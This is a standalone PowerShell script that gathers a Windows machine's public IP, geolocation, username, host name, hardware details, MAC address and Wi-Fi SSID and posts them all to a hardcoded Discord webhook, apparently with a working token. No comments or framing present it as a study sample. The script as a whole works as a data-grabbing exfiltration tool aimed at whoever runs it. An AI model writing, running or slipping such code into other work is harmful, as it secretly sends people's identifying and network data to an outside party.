$ip = (Invoke-RestMethod -Uri "https://api.ipify.org")

$geo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
$city = $geo.city
$region = $geo.region
$country = $geo.country

$usr = $env:USERNAME
$hostname = $env:COMPUTERNAME

$cpu = (Get-CimInstance Win32_Processor).Name
$gpu = (Get-CimInstance Win32_VideoController).Name
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

$mac = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress
$ssid = (netsh wlan show interfaces) -match 'SSID' | Select-Object -First 1

$webhookUrl = "https://discord.com/api/webhooks/1393282038219669607/aaxKUcoisulTy_UD7dW7kuCWkMlYtdED4xPDQ2w0tnrbykYOA0u5TfjzoAjASnuNxUQz"

$output = @{
    content = 
    "
    IP: $ip
    Location: $city, $region, $country
    Name: $usr
    PC Name: $hostname
    CPU: $cpu
    GPU: $gpu
    RAM: $ram
    MAC Address: $mac
    SSID: $ssid
    "
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $output -ContentType "application/json"
